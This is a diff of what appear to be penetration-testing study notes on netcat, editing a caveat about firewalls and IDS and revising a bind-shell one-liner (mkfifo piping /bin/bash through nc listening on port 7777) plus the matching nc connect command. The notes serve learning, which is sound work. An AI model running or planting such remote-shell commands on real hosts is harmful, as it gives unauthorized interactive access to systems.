@@ -1,4 +1,4 @@
-usually the server will have firewalls and network restrictions when we try to open ports, so in real scenarios we need to use already listening ports on that host network.
+keep in mind that usually the server will have security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc... It will be much harder to pull this off in a real-world scenario
 
 ## tcp connection
 
@@ -13,13 +13,14 @@ nc -nv <remote_host_ip> 7777
 ```
 ---
 ## establishing a basic shell
+ security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc...)
 
 remote server
 ```
-rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f
 ```
 
 attack machine
 ```
-nc -nv 10.129.41.200 7777
+nc -nv <remote_host_ip> 7777
 ```
